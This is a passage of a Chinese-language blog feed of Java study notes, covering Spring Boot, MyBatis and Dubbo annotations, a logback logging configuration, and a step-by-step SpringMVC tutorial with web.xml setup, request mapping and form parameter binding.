class="meta">@SpringBootApplication</span> ： 放在启动类上面， 包含了<span class="meta">@SpringBootConfiguration</span></span><br><span class="line">                          <span class="meta">@EnableAutoConfiguration</span>， <span class="meta">@ComponentScan</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">MyBatis相关的注解</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span> ： 放在类的上面 ， 让MyBatis找到接口， 创建他的代理对象    </span><br><span class="line"><span class="meta">@MapperScan</span> :放在主类的上面 ， 指定扫描的包， 把这个包中的所有接口都创建代理对象。 对象注入到容器中</span><br><span class="line"><span class="meta">@Param</span> ： 放在dao接口的方法的形参前面， 作为命名参数使用的。</span><br><span class="line">    </span><br><span class="line">Dubbo注解</span><br><span class="line"><span class="meta">@DubboService</span>: 在提供者端使用的，暴露服务的， 放在接口的实现类上面</span><br><span class="line"><span class="meta">@DubboReference</span>:  在消费者端使用的， 引用远程服务， 放在属性上面使用。</span><br><span class="line"><span class="meta">@EnableDubbo</span> : 放在主类上面， 表示当前引用启用Dubbo功能。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="10-2日志服务logback"><a href="#10-2日志服务logback" class="headerlink" title="10.2日志服务logback"></a>10.2日志服务logback</h2><p>首先需要在spring application.yaml中指定日志的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">logging:</span><br><span class="line">  config: classpath:logback-spring.xml</span><br></pre></td></tr></table></figure><p>在项目工程中，还会在 application.yaml中 指定环境，环境和日志中的环境对应，开发环境的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  profiles:</span><br><span class="line">    # 包含使用application-xxx.xml文件，如下的application-prod.xml</span><br><span class="line">    active: dev</span><br></pre></td></tr></table></figure><p>然后在日志的配置文件logback-spring.xml中配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration scan=&quot;true&quot; scanPeriod=&quot;60 seconds&quot; debug=&quot;false&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;conversionRule conversionWord=&quot;clr&quot; converterClass=&quot;org.springframework.boot.logging.logback.ColorConverter&quot; /&gt;</span><br><span class="line">    &lt;conversionRule conversionWord=&quot;wex&quot; converterClass=&quot;org.springframework.boot.logging.logback.WhitespaceThrowableProxyConverter&quot; /&gt;</span><br><span class="line">    &lt;conversionRule conversionWord=&quot;wEx&quot; converterClass=&quot;org.springframework.boot.logging.logback.ExtendedWhitespaceThrowableProxyConverter&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;logback.logdir&quot; value=&quot;./logs&quot;/&gt;</span><br><span class="line">    &lt;property name=&quot;logback.appname&quot; value=&quot;AI_AIBUM&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;contextName&gt;$&#123;logback.appname&#125;&lt;/contextName&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--输出到控制台 ConsoleAppender--&gt;</span><br><span class="line">    &lt;appender name=&quot;consoleLog&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt;</span><br><span class="line">        &lt;!--展示格式 layout--&gt;</span><br><span class="line">        &lt;encoder class=&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;</span><br><span class="line">            &lt;pattern&gt;$&#123;CONSOLE_LOG_PATTERN:-%clr(%d&#123;$&#123;LOG_DATEFORMAT_PATTERN:-yyyy-MM-dd HH:mm:ss.SSS&#125;&#125;)&#123;faint&#125; %clr($&#123;LOG_LEVEL_PATTERN:-%5p&#125;) %clr($&#123;PID:- &#125;)&#123;magenta&#125; %clr(---)&#123;faint&#125; %clr([%15.15t])&#123;faint&#125; %clr(%-40.40logger&#123;39&#125;)&#123;cyan&#125; %clr(:)&#123;faint&#125; %m%n$&#123;LOG_EXCEPTION_CONVERSION_WORD:-%wEx&#125;&#125;&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--输出到文件 RollingFileAppender--&gt;</span><br><span class="line">    &lt;appender name=&quot;fileInfoLog&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt;</span><br><span class="line">        &lt;!--如果只是想要 Info 级别的日志，只是过滤 info 还是会输出 Error 日志，因为 Error 的级别高，</span><br><span class="line">        所以我们使用下面的策略，可以避免输出 Error 的日志--&gt;</span><br><span class="line">&lt;!--        &lt;filter class=&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&gt;--&gt;</span><br><span class="line">&lt;!--            &amp;lt;!&amp;ndash;过滤 INFO&amp;ndash;&amp;gt;--&gt;</span><br><span class="line">&lt;!--            &lt;level&gt;DEBUG&lt;/level&gt;--&gt;</span><br><span class="line">&lt;!--        &lt;/filter&gt;--&gt;</span><br><span class="line">        &lt;!--日志名称，如果没有File 属性，那么只会使用FileNamePattern的文件路径规则</span><br><span class="line">            如果同时有&lt;File&gt;和&lt;FileNamePattern&gt;，那么当天日志是&lt;File&gt;，明天会自动把今天</span><br><span class="line">            的日志改名为今天的日期。即，&lt;File&gt; 的日志都是当天的。</span><br><span class="line">        --&gt;</span><br><span class="line">        &lt;!--        &lt;File&gt;$&#123;logback.logdir&#125;/info.$&#123;logback.appname&#125;.log&lt;/File&gt;--&gt;</span><br><span class="line">        &lt;!--滚动策略，按照时间滚动 TimeBasedRollingPolicy--&gt;</span><br><span class="line">        &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt;</span><br><span class="line">            &lt;!--文件路径,定义了日志的切分方式——把每一天的日志归档到一个文件中（因为文件名包括了日期，日期精确到天数）,以防止日志填满整个磁盘空间--&gt;</span><br><span class="line">            &lt;FileNamePattern&gt;$&#123;logback.logdir&#125;/info.$&#123;logback.appname&#125;.%d&#123;yyyy-MM-dd&#125;.log&lt;/FileNamePattern&gt;</span><br><span class="line">            &lt;!--只保留最近90天的日志--&gt;</span><br><span class="line">            &lt;maxHistory&gt;30&lt;/maxHistory&gt;</span><br><span class="line">            &lt;!--用来指定日志文件的上限大小，那么到了这个值，就会删除旧的日志--&gt;</span><br><span class="line">            &lt;!--&lt;totalSizeCap&gt;1GB&lt;/totalSizeCap&gt;--&gt;</span><br><span class="line">        &lt;/rollingPolicy&gt;</span><br><span class="line">        &lt;!--日志输出编码格式化--&gt;</span><br><span class="line">        &lt;encoder class=&quot;ch.qos.logback.classic.encoder.PatternLayoutEncoder&quot;&gt;</span><br><span class="line">            &lt;charset&gt;UTF-8&lt;/charset&gt;</span><br><span class="line">            &lt;pattern&gt;$&#123;FILE_LOG_PATTERN:-%d&#123;$&#123;LOG_DATEFORMAT_PATTERN:-yyyy-MM-dd HH:mm:ss.SSS&#125;&#125; $&#123;LOG_LEVEL_PATTERN:-%5p&#125; $&#123;PID:- &#125; --- [%15t] %-40.40logger&#123;39&#125; : %m%n$&#123;LOG_EXCEPTION_CONVERSION_WORD:-%wEx&#125;&#125;&lt;/pattern&gt;</span><br><span class="line">        &lt;/encoder&gt;</span><br><span class="line">    &lt;/appender&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--     测试环境+开发环境. 多个使用逗号隔开. --&gt;</span><br><span class="line">    &lt;springProfile name=&quot;test,dev&quot;&gt;</span><br><span class="line">        &lt;!--指定最基础的日志输出级别--&gt;</span><br><span class="line">        &lt;root level=&quot;INFO&quot;&gt;</span><br><span class="line">            &lt;!--appender将会添加到这个loger--&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;consoleLog&quot;/&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;fileInfoLog&quot;/&gt;</span><br><span class="line">        &lt;/root&gt;</span><br><span class="line">&lt;!--        &lt;logger name=&quot;com.example.demo.controller&quot; level=&quot;DEBUG&quot; additivity=&quot;false&quot;&gt;--&gt;</span><br><span class="line">&lt;!--            &lt;appender-ref ref=&quot;consoleLog&quot;/&gt;--&gt;</span><br><span class="line">&lt;!--        &lt;/logger&gt;--&gt;</span><br><span class="line">    &lt;/springProfile&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 生产环境. --&gt;</span><br><span class="line">    &lt;springProfile name=&quot;prod&quot;&gt;</span><br><span class="line">        &lt;!--指定最基础的日志输出级别--&gt;</span><br><span class="line">        &lt;root level=&quot;INFO&quot;&gt;</span><br><span class="line">            &lt;!--appender将会添加到这个loger--&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;fileInfoLog&quot;/&gt;</span><br><span class="line">        &lt;/root&gt;</span><br><span class="line">&lt;!--        &lt;logger name=&quot;com.example.demo.controller&quot; level=&quot;INFO&quot; additivity=&quot;false&quot;&gt;--&gt;</span><br><span class="line">&lt;!--            &lt;appender-ref ref=&quot;consoleLog&quot;/&gt;--&gt;</span><br><span class="line">&lt;!--        &lt;/logger&gt;--&gt;</span><br><span class="line">    &lt;/springProfile&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>在项目中使用时，可以采用Spring的注解：@Slf4j</p><p>然后就可以在代码中使用log.info  log.error进行日志的输出了</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringMVC框架</title>
    <link href="/2023/06/18/SpringMVC%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/06/18/SpringMVC%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="SpringMVC介绍"><a href="#SpringMVC介绍" class="headerlink" title="SpringMVC介绍"></a>SpringMVC介绍</h2><p>  它是基于MVC开发模式的框架,用来优化控制器.它是Spring家族的一员.它也具备IOC和AOP.</p><p>  什么是MVC?<br>  它是一种开发模式,它是模型视图控制器的简称.所有的web应用都是基于MVC开发.<br>  M:模型层,包含实体类,业务逻辑层,数据访问层<br>  V:视图层,html,javaScript,vue等都是视图层,用来显现数据<br>  C:控制器,它是用来接收客户端的请求,并返回响应到客户端的组件,Servlet就是组件</p><p>SpringMVC框架的优点<br>  1)轻量级,基于MVC的框架<br>  2)易于上手,容易理解,功能强大<br>  3)它具备IOC和AOP<br>  4)完全基于注解开发</p><p><strong>web请求执行的流程</strong><br>                                  核心处理器 DispatcharServlet 要在web.xml文件中注册才可用.</p><p>mvc执行流程图</p><p><img src="/upload/2022/04/image-d68c0d2172034d549d64b458e5d50d55.png" alt="image.png"></p><ol><li>客户端（浏览器）发送请求，直接请求到 DispatcherServlet。</li><li>DispatcherServlet 根据请求信息调用 HandlerMapping，解析请求对应的 Handler。</li><li>解析到对应的 Handler（也就是我们平常说的 Controller 控制器）后，开始由 HandlerAdapter 适配器处理。</li><li>HandlerAdapter 会根据 Handler来调用真正的处理器来处理请求，并处理相应的业务逻辑。</li><li>处理器处理完业务后，会返回一个 ModelAndView 对象，Model 是返回的数据对象，View 是个逻辑上的 View。</li><li>ViewResolver 会根据逻辑 View 查找实际的 View。</li><li>DispaterServlet 把返回的 Model 传给 View（视图渲染）。</li><li>把 View 返回给请求者（浏览器）</li></ol><h2 id="SpringMVC框架开发"><a href="#SpringMVC框架开发" class="headerlink" title="SpringMVC框架开发"></a>SpringMVC框架开发</h2><h3 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h3><p>  1)新建项目,选择webapp模板.<br>  2)修改目录,添加缺失的test,java,resources(两套),并修改目录属性<br>SSM整合项目结构如下图：<br><img src="/upload/2022/04/image-0eaba4a1e3844495a0d103e0ff1cad00.png" alt="image.png"><br>  3)修改pom.xml文件,添加SpringMVC的依赖,添加Servlet的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--添加servlet的依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  4)添加springmvc.xml配置文件,指定包扫描,添加视图解析器.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--添加包扫描--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.hukaichao.controller&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--添加视图解析器--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--配置前缀--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/views/&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--配置后缀--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  5)删除web.xml文件,新建web.xml（因为模板自带的web.xml版本太低，需改修改为4.0版本）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  6)在web.xml文件中注册springMVC框架(所有的web请求都是基于servlet的)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--注册SpringMVC框架--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    URL匹配规则，表示哪些请求交给SpringMVC处理，“/”表示拦截所有请求</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  7)在webapp目录下新建views目录,在views目录下新建*.jsp页面,在index.jsp页面发送请求给服务器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/demo&quot;</span>&gt;</span>访问服务器<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以不用这一步，直接在浏览器输入访问路径：<br><a href="http://localhost:8080/demo">http://localhost:8080/demo</a></p><p>  8)开发控制器(Servlet),它是一个普通的类.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Controller</span>  <span class="comment">//交给Spring去创建对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 以前的Servlet的规范</span></span><br><span class="line"><span class="comment">     * protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;&#125;</span></span><br><span class="line"><span class="comment">     * action中所有的功能实现都是由方法来完成的</span></span><br><span class="line"><span class="comment">     * action方法的规范</span></span><br><span class="line"><span class="comment">     * 1)访问权限是public</span></span><br><span class="line"><span class="comment">     * 2)方法的返回值任意</span></span><br><span class="line"><span class="comment">     * 3)方法名称任意</span></span><br><span class="line"><span class="comment">     * 4)方法可以没有参数,如果有可是任意类型</span></span><br><span class="line"><span class="comment">     * 5)要使用<span class="doctag">@RequestMapping</span>注解来声明一个访问的路径(名称)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/demo&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">demo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;服务器被访问到了.......&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;  <span class="comment">//可以直接跳到/views/main.jsp页面上</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  9)添加tomcat进行测试功能</p><h3 id="RequestMapping注解"><a href="#RequestMapping注解" class="headerlink" title="@RequestMapping注解"></a>@RequestMapping注解</h3><p>  此注解就是来映射服务器访问的路径.<br>  1)此注解可加在方法上,是为此方法注册一个可以访问的名称(路径)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/demo&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">demo</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;服务器被访问到了.......&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;  <span class="comment">//可以直接跳到/views/main.jsp页面上</span></span><br><span class="line">  &#125;</span><br><span class="line">&lt;a href=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/demo.action&quot;</span>&gt;访问服务器&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>  2)此注解可以加在类上,相当于是包名(虚拟路径),区分不同类中相同的action的名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoAction1</span> &#123;..&#125;</span><br><span class="line">&lt;a href=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/demo&quot;</span>&gt;访问服务器&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>  3)此注解可区分get请求和post请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/req&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">req</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是处理get请求的........&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/req&quot; ,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">req1</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是处理post请求的........&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="五种数据提交方式的优化"><a href="#五种数据提交方式的优化" class="headerlink" title="五种数据提交方式的优化"></a>五种数据提交方式的优化</h3><p>  1)单个提交数据<br>  页面:  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/one.action&quot;</span>&gt;</span></span><br><span class="line">    姓名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;myname&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    年龄:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>  action:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/one&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">one</span><span class="params">(String myname,<span class="type">int</span> age)</span>&#123;  ===&gt;自动注入,并且类型转换</span><br><span class="line">      System.out.println(<span class="string">&quot;myname=&quot;</span>+myname+<span class="string">&quot;,age=&quot;</span>+(age+<span class="number">100</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;main&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>  2)对象封装提交数据<br>    在提交请求中,保证请求参数的名称与实体类中成员变量的名称一致,则可以自动创建对象,则可以自动提交数据,自动类型转换,自动封装数据到对象中.<br>    实体类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Users</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> age;&#125;</span><br></pre></td></tr></table></figure><p> 页面:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/two.action&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    姓名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    年龄:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span 